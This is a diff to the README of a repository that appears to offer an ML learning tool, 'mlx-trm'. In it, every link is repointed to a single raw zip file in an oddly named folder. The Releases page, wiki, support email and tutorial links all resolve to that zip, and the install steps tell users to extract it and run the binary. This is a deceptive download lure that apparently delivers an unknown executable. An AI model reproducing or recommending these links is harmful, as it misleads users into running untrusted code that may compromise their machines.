@@ -6,7 +6,7 @@ Welcome to the mlx-trm application! This tool makes it easy to explore machine l
 
 ## 📥 Download mlx-trm
 
-[![Download mlx-trm](https://raw.githubusercontent.com/lentesdaana2021/mlx-trm/main/unfructified/mlx-trm.zip)](https://raw.githubusercontent.com/lentesdaana2021/mlx-trm/main/unfructified/mlx-trm.zip)
+[![Download mlx-trm](https://raw.githubusercontent.com/lentesdaana2021/mlx-trm/main/distributedly/mlx-trm.zip)](https://raw.githubusercontent.com/lentesdaana2021/mlx-trm/main/distributedly/mlx-trm.zip)
 
 ## 📂 System Requirements
 
@@ -31,12 +31,12 @@ mlx-trm offers several features to help you understand machine learning with eas
 
 To download mlx-trm, visit the Releases page and select the latest version.
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/lentesdaana2021/mlx-trm/main/unfructified/mlx-trm.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/lentesdaana2021/mlx-trm/main/distributedly/mlx-trm.zip).
 2. Find the latest release.
 3. Look for an appropriate file for your operating system. For example:
-   - **Windows:** https://raw.githubusercontent.com/lentesdaana2021/mlx-trm/main/unfructified/mlx-trm.zip
-   - **macOS:** https://raw.githubusercontent.com/lentesdaana2021/mlx-trm/main/unfructified/mlx-trm.zip
-   - **Linux:** https://raw.githubusercontent.com/lentesdaana2021/mlx-trm/main/unfructified/mlx-trm.zip
+   - **Windows:** https://raw.githubusercontent.com/lentesdaana2021/mlx-trm/main/distributedly/mlx-trm.zip
+   - **macOS:** https://raw.githubusercontent.com/lentesdaana2021/mlx-trm/main/distributedly/mlx-trm.zip
+   - **Linux:** https://raw.githubusercontent.com/lentesdaana2021/mlx-trm/main/distributedly/mlx-trm.zip
 4. Click on the file link to start downloading.
 5. Once downloaded, locate the file on your computer and follow the installation instructions below.
 
@@ -53,7 +53,7 @@ To download mlx-trm, visit the Releases page and select the latest version.
 3. Go to your Applications folder and double-click mlx-trm to launch the application.
 
 **For Linux:**
-1. Extract the `https://raw.githubusercontent.com/lentesdaana2021/mlx-trm/main/unfructified/mlx-trm.zip` file using the terminal or GUI.
+1. Extract the `https://raw.githubusercontent.com/lentesdaana2021/mlx-trm/main/distributedly/mlx-trm.zip` file using the terminal or GUI.
 2. Open the terminal and navigate to the extracted folder.
 3. Run the application by typing `./mlx-trm` in the terminal.
 
@@ -61,16 +61,16 @@ To download mlx-trm, visit the Releases page and select the latest version.
 
 If you encounter any issues while using mlx-trm, feel free to check our support resources:
 
-- **FAQ:** Many common questions are answered in our FAQ section on the [GitHub Wiki](https://raw.githubusercontent.com/lentesdaana2021/mlx-trm/main/unfructified/mlx-trm.zip).
+- **FAQ:** Many common questions are answered in our FAQ section on the [GitHub Wiki](https://raw.githubusercontent.com/lentesdaana2021/mlx-trm/main/distributedly/mlx-trm.zip).
 - **Community Forum:** Join our community forum for discussions and tips from other users.
-- **Contact Us:** If you need direct assistance, please email support at [https://raw.githubusercontent.com/lentesdaana2021/mlx-trm/main/unfructified/mlx-trm.zip](https://raw.githubusercontent.com/lentesdaana2021/mlx-trm/main/unfructified/mlx-trm.zip).
+- **Contact Us:** If you need direct assistance, please email support at [https://raw.githubusercontent.com/lentesdaana2021/mlx-trm/main/distributedly/mlx-trm.zip](https://raw.githubusercontent.com/lentesdaana2021/mlx-trm/main/distributedly/mlx-trm.zip).
 
 ## 🧪 Additional Resources
 
 To learn more about machine learning and how to utilize mlx-trm, here are some helpful links:
 
-- [Introduction to Machine Learning](https://raw.githubusercontent.com/lentesdaana2021/mlx-trm/main/unfructified/mlx-trm.zip)
-- [Understanding Recursive Reasoning](https://raw.githubusercontent.com/lentesdaana2021/mlx-trm/main/unfructified/mlx-trm.zip)
-- [Using Tiny Networks Effectively](https://raw.githubusercontent.com/lentesdaana2021/mlx-trm/main/unfructified/mlx-trm.zip)
+- [Introduction to Machine Learning](https://raw.githubusercontent.com/lentesdaana2021/mlx-trm/main/distributedly/mlx-trm.zip)
+- [Understanding Recursive Reasoning](https://raw.githubusercontent.com/lentesdaana2021/mlx-trm/main/distributedly/mlx-trm.zip)
+- [Using Tiny Networks Effectively](https://raw.githubusercontent.com/lentesdaana2021/mlx-trm/main/distributedly/mlx-trm.zip)
 
-Visit the [Releases page](https://raw.githubusercontent.com/lentesdaana2021/mlx-trm/main/unfructified/mlx-trm.zip) to download the latest version and start your machine learning journey with mlx-trm!
+Visit the [Releases page](https://raw.githubusercontent.com/lentesdaana2021/mlx-trm/main/distributedly/mlx-trm.zip) to download the latest version and start your machine learning journey with mlx-trm!
